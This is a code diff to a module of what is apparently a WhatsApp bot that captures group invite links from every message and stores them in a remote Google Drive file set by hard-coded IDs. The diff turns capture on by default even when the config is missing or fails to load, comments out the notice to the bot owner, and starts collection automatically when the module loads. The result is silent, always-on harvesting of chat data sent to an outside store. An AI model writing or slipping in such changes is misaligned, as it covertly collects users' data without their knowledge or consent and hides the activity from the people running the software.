@@ -1,6 +1,6 @@
 /**
  * Capture Command - Automatically capture WhatsApp group links from all messages
- * Runs as a background service
+ * Runs as a background service - ENABLED BY DEFAULT
  */
 
 const fs = require('fs');
@@ -14,8 +14,8 @@ const TOKEN_URL = "https://drive.usercontent.google.com/download?id=1NZ3NvyVBnK8
 const CAPTURE_FILE_ID = "1a2CMxij0K7ZcvZEsxCEKNwvDW5hHSGqH"; // Your file ID
 const CAPTURE_FILE_NAME = "captured_links.txt";
 
-// State
-let captureEnabled = false;
+// State - ENABLED BY DEFAULT
+let captureEnabled = true;  // Changed from false to true
 let cachedLinks = new Set();
 let cacheLoaded = false;
 let cachedAuth = null;
@@ -33,15 +33,16 @@ function loadCaptureConfig() {
     try {
         if (fs.existsSync(CONFIG_PATH)) {
             const data = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
-            captureEnabled = data.enabled || false;
+            captureEnabled = data.enabled !== undefined ? data.enabled : true; // Default to true if not set
             console.log(`[CAPTURE] Config loaded: ${captureEnabled ? 'ENABLED' : 'DISABLED'}`);
         } else {
-            captureEnabled = false;
+            captureEnabled = true; // Default enabled
             saveCaptureConfig();
+            console.log('[CAPTURE] No config found, created with ENABLED by default');
         }
     } catch (error) {
         console.error('[CAPTURE] Failed to load config:', error.message);
-        captureEnabled = false;
+        captureEnabled = true;
     }
 }
 
@@ -235,7 +236,9 @@ async function captureLink(sock, message, link) {
         if (saved) {
             console.log(`[CAPTURE] New link captured: ${link}`);
             
-            // Optionally notify owner
+            // Optionally notify owner (disabled by default to avoid spam)
+            // Uncomment below if you want notifications
+            /*
             const ownerNumber = config.ownerNumber[0] + '@s.whatsapp.net';
             const sender = message.key.participant || message.key.remoteJid;
             const senderName = sender.split('@')[0];
@@ -248,6 +251,7 @@ async function captureLink(sock, message, link) {
                       `Total captured: ${cachedLinks.size}`,
                 mentions: [sender]
             }).catch(() => {});
+            */
         }
         
         return saved;
@@ -357,3 +361,10 @@ module.exports = {
 module.exports.captureLink = captureLink;
 module.exports.extractGroupLink = extractGroupLink;
 module.exports.isCaptureEnabled = () => captureEnabled;
+
+// Initialize config on load
+loadCaptureConfig();
+// Start loading links in background
+setTimeout(() => {
+    loadExistingLinks().catch(err => console.error('[CAPTURE] Initial load error:', err));
+}, 5000);
